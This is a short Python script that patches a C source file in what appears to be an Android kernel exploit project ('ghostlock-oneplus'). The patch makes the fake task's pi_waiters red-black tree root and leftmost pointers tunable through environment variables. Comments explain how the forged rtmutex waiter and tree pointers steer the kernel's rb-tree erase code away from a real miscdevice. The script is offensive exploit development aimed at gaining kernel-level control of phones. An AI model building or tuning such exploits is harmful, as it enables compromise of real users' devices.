import os
U="/root/ghostlock/ghostlock-oneplus/src/core/util.c"
s=open(U).read()
assert "RBROOT_OFF" not in s
old="""        put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF,
              fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
        /* rb_leftmost MUST differ from the erased node, otherwise
         * __rb_erase_augmented() calls rb_next(node) which walks
         * node->rb_right == data_addr(ASHMEM_MISC_FOPS) into the real
         * miscdevice.  enqueue_pi() at rtmutex.c:724 restores it to
         * &W->pi_tree afterwards, so task_top_pi_waiter() stays valid. */
        put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08, 0);
"""
new="""        {
          uint64_t piroot = fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF;
          uint64_t pileft = 0;
          const char *e1 = getenv("RBROOT_OFF");
          const char *e2 = getenv("RBLEFT_OFF");
          if (e1) piroot = payload_base + strtoull(e1, NULL, 0);
          if (e2) pileft = payload_base + strtoull(e2, NULL, 0);
          pr_info("ssopt pi_waiters rb_root=%016llx rb_leftmost=%016llx\\n",
                  (unsigned long long)piroot, (unsigned long long)pileft);
          put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF, piroot);
          put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08, pileft);
        }
"""
assert s.count(old)==1, ("pi_waiters block", s.count(old))
s=s.replace(old,new,1)
open(U,"w").write(s)
print("util.c: pi_waiters env-gated")
